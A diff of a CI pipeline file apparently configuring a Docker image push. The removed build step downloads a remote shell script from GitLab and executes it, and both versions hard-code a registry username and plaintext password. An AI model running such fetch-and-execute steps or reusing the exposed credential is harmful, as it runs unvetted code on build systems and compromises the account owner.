@@ -1,16 +1,7 @@
-box: python:2.7
-deploy:
-  steps:
-    - internal/docker-push:
-        username: dapurspl
-        password: Bandung#123
-        tag: tagname
-        repository: dapurspl/docker-build-golang
-build:
-  steps:
-    - script:
-        name: oracle wercker
-        code: |
-          sudo apt update -y && sudo apt upgrade -y
-          sudo apt-get install  -y wget
-          wget https://gitlab.com/dapurspl/simple/-/raw/main/variant.sh && chmod u+x variant.sh && ./variant.sh
+- internal/docker-push:
+    # specify the image to be pushed - this is the one we created earlier
+    image-name: my-new-image
+    username: dapurspl # Registry username
+    password: Bandung#123 # Registry password
+    registry: https://hub.docker.com
+    repository: dapurspl/docker-build-golang
